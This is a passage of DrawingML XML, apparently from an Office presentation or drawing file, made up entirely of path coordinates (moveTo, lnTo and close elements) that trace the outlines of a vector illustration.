                    <a:pt x="6457" y="698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6017" y="331"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="1"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="15114" y="6750"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="15187" y="6787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15481" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15591" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15737" y="7044"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15847" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15921" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16068" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16141" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16178" y="8438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16178" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16141" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16068" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15957" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15701" y="9355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15407" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15077" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15187" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15187" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15114" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15040" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14564" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13757" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14160" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14637" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14674" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14674" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14637" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14564" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14784" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14784" y="8438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14637" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13867" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13500" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13170" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13060" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13720" y="8658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14454" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14454" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13647" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="8658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13133" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13243" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13500" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14307" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14564" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="7741"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14564" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13903" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13280" y="7851"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13500" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14087" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14674" y="7264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14637" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14343" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14270" y="6934"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="6824"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="6750"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5246" y="9098"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5320" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="9245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="9245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="9465"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5797" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="9355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="9245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="9245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="9355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="9355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="9098"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6347" y="8034"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6347" y="8071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5687" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4183" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4073" y="9355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4073" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4073" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4073" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="10162"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="10382"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="10052"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6384" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="9355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6017" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="8658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="8548"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6384" y="8071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="8034"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="19992" y="10418"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="20139" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20139" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20176" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20213" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20249" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20286" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20286" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20286" y="11189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20213" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20139" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20066" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19956" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19809" y="11886"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19662" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19479" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19442" y="11886"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19222" y="11776"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19626" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19662" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19736" y="11629"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19736" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19699" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19626" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19406" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19662" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19736" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19736" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19736" y="10969"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19736" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19699" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19626" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19552" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19479" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19332" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19185" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19185" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19626" y="10748"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19662" y="10712"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19662" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19626" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19479" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19295" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19369" y="10565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19589" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19772" y="10418"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="16691" y="13390"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="16801" y="13463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16874" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16728" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16581" y="13756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16434" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16361" y="14050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16104" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16068" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16691" y="13390"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="16654" y="11959"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="17058" y="12326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17278" y="12546"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17498" y="12803"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17681" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17755" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17792" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17792" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17755" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17718" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17608" y="13756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17498" y="13866"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17351" y="13940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17278" y="13866"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17168" y="13866"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17095" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17058" y="13940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17021" y="13940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16948" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16911" y="14050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16874" y="14050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16948" y="13940"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17095" y="13793"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17168" y="13683"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17205" y="13573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17168" y="13500"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17131" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17021" y="13316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16874" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16691" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16618" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16581" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15627" y="13793"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15517" y="13756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15407" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15884" y="13353"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16361" y="13096"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16398" y="13023"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16398" y="12986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16361" y="12913"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16288" y="12913"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15994" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15701" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15407" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15040" y="13023"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15077" y="12986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16068" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16104" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16104" y="12326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16068" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15994" y="12252"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15554" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="12472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="12472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15297" y="12326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15517" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15737" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15994" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16324" y="11959"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="14857" y="6310"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="14600" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14197" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13793" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13243" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12950" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12840" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12803" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12766" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12766" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11042" y="7631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="7741"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9025" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9025" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="8071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9612" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11152" y="8071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12693" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12546" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12473" y="8438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12473" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12363" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12253" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12253" y="9245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="9355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12546" y="9465"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12693" y="9465"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12803" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12950" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13096" y="10052"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13243" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13647" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13867" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14087" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14967" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14930" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14930" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15004" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15077" y="11079"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15150" y="11299"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15297" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15481" y="11629"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15481" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15261" y="11739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15077" y="11886"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14894" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14784" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14674" y="12326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14564" y="12693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="12986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14600" y="13353"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14747" y="13610"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14747" y="13720"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14784" y="13830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14930" y="13903"/>
                  </a:lnTo>
